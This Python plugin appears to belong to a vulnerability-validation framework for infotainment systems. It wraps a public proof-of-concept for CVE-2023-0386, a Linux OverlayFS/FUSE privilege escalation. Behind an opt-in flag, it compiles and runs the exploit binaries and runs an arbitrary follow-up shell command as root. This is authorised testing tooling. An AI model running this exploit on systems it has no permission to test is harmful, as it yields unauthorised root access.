#!/usr/bin/env python3
"""CVE-2023-0386 – OverlayFS copy-up of FUSE file incorrectly preserves file capabilities for non-p.

Public PoC source: https://github.com/puckiestyle/CVE-2023-0386
  Files: ['exp.c', 'fuse.c', 'getshell.c']
  Technique: 1) Mount FUSE FS with synthetic file having setuid+cap_setuid. 2) Mount overlayfs with FUSE as lower layer. 3) Copy-up preserves capabilities → created file in upper layer is owned by caller but has cap_setuid → execve → root shell.

Reference: https://ssd-disclosure.com/ssd-advisory-overlayfs-exploit/
"""
from __future__ import annotations

import shutil
import subprocess
import tempfile
from pathlib import Path

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id": 45,
    "cve": "CVE-2023-0386",
    "year": 2023,
    "domain": "advanced",
    "vendor_product": "Linux kernel 5.11–6.2 (IVI with overlayfs / container support)",
    "component": "Linux overlayfs + FUSE – copy-up with incorrect inode owner/capabilities",
    "type": "Local Privilege Escalation (LPE) → root",
    "summary": (
        "OverlayFS copy-up of FUSE file incorrectly preserves file capabilities for non-privileged users. exp.c + fuse.c allow unprivileged user to gain a setuid-root binary via FUSE overlay → root shell."
    ),
    "source_url": "https://github.com/puckiestyle/CVE-2023-0386",
    "requires_manual_review": True,
    "affected": [{"vendor": "Linux / Android",
                  "product": "Linux kernel 5.11–6.2 (IVI with overlayfs / container support)",
                  "versions": [{"version": "pre-patch", "status": "affected"}]}],
}

POC_REPO = Path(__file__).parent.parent.parent /     "public_poc_sources/repos/puckiestyle__CVE-2023-0386"


def _compile_and_run(allow_disruptive: bool, compile_cmd: str,
                     run_cmd: str, lab_cmd: str) -> dict:
    result = {}
    if not POC_REPO.exists():
        result["error"] = f"PoC repo not found at {POC_REPO}"
        return result

    if not allow_disruptive:
        result["would_compile"] = compile_cmd
        result["would_run"]     = run_cmd
        result["detail"] = "Set allow_disruptive=true to compile and run exploit."
        return result

    with tempfile.TemporaryDirectory() as tmpdir:
        # Copy repo contents to tmpdir
        import shutil as _shutil
        for f in POC_REPO.rglob("*"):
            if f.is_file():
                dest = Path(tmpdir) / f.relative_to(POC_REPO)
                dest.parent.mkdir(parents=True, exist_ok=True)
                _shutil.copy2(str(f), str(dest))

        # Compile
        if compile_cmd:
            r = subprocess.run(compile_cmd, shell=True, cwd=tmpdir,
                               capture_output=True, text=True, timeout=60)
            result["compile_rc"]  = r.returncode
            result["compile_out"] = (r.stdout + r.stderr)[:400]
            if r.returncode != 0:
                result["detail"] = "Compile failed – check gcc/make available on system."
                return result

        # Run
        if run_cmd:
            run_full = run_cmd
            if lab_cmd and lab_cmd != run_cmd:
                run_full = f"{run_cmd} && {lab_cmd}"
            r2 = subprocess.run(run_full, shell=True, cwd=tmpdir,
                                capture_output=True, text=True, timeout=120)
            result["run_rc"]   = r2.returncode
            result["run_out"]  = (r2.stdout + r2.stderr)[:400]
            result["exploited"] = ("root" in r2.stdout.lower() or
                                   "uid=0" in r2.stdout or
                                   "# " in r2.stdout)
    return result


def _check_version() -> dict:
    """Check if the local system appears vulnerable."""
    result = {}
    check_cmd = ''
    if check_cmd:
        try:
            r = subprocess.run(check_cmd, shell=True, capture_output=True,
                               text=True, timeout=10)
            result["check_out"] = (r.stdout + r.stderr)[:200]
        except Exception as exc:
            result["check_error"] = str(exc)
    return result


def _run_poc(plugin):
    allow_disruptive = getattr(plugin, "_allow_disruptive", False) or \
        bool((plugin.params or {}).get("allow_disruptive"))
    lab_cmd = (plugin.params or {}).get("lab_command", "id")

    evidence = {
        "cve": "CVE-2023-0386",
        "poc_repo": str(POC_REPO),
        "poc_repo_present": POC_REPO.exists(),
        "exploit_files": ['exp.c', 'fuse.c', 'getshell.c'],
        "technique": (
            "1) Mount FUSE FS with synthetic file having setuid+cap_setuid. 2) Mount overlayfs with FUSE as lower layer. 3) Copy-up preserves capabilities → created file in upper layer is owned by caller but has cap_setuid → execve → root shell."
        ),
        "reference": "https://ssd-disclosure.com/ssd-advisory-overlayfs-exploit/",
    }

    ver = _check_version()
    evidence.update(ver)

    exploit = _compile_and_run(
        allow_disruptive,
        compile_cmd='make',
        run_cmd="bash -c './fuse /tmp/fuse_mount && ./exp'",
        lab_cmd=lab_cmd,
    )
    evidence.update(exploit)

    return {
        "vulnerable": evidence.get("exploited"),
        "evidence": evidence,
        "requires_manual_review": True,
        "poc_source": "https://github.com/puckiestyle/CVE-2023-0386",
    }


class Poc45CVE20230386FuseOvlPrivEscAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "public_poc_exp_50_more"
    meta_display_id = "POC-ADV-045"
    meta_poc_name   = "CVE-2023-0386 OverlayFS copy-up of FUSE file incorrectly preserves file capabilities for non-p"
    meta_cve_id     = "CVE-2023-0386"
    meta_severity   = "High"
    meta_protocol   = "local"
    meta_target_os  = ["linux"]
    meta_required_params = []
    meta_optional_params = ["allow_disruptive", "lab_command"]
    meta_profiles   = ["advanced"]
    meta_source_url = "https://github.com/puckiestyle/CVE-2023-0386"
    meta_attack_surface = "1) Mount FUSE FS with synthetic file having setuid+cap_setuid. 2) Mount overlayf"
    is_disruptive   = True
    meta_destructive_level = "RootCompromise"

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)
